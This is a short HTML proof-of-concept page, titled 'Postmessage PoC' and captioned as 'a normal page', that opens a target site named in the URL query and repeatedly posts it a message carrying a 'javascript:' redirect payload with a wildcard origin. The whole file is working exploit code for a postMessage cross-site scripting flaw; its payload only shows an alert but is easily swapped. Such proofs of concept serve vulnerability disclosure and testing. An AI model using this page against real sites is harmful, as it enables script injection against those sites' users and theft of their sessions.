<!DOCTYPE html>
<html>
  <head>
    
    <meta charset="UTF-8" />
    <title>Postmessage PoC</title>
  
  </head>
  <body>

<h1> Hi this is a normal page !</h1>
    <script>

    window.onload = function () {

        var qs = new URLSearchParams(location.search),
        target=qs.get("target");

      let win = window.open(target);
      let msg = JSON.stringify({
        "action": "redirect",
        "if_redirect": "javascript:alert(document.domain)"
    });

      setInterval(function () {
          win.postMessage(msg, "*");
        }, 2000);

    }
      
    </script>
  </body>
</html>
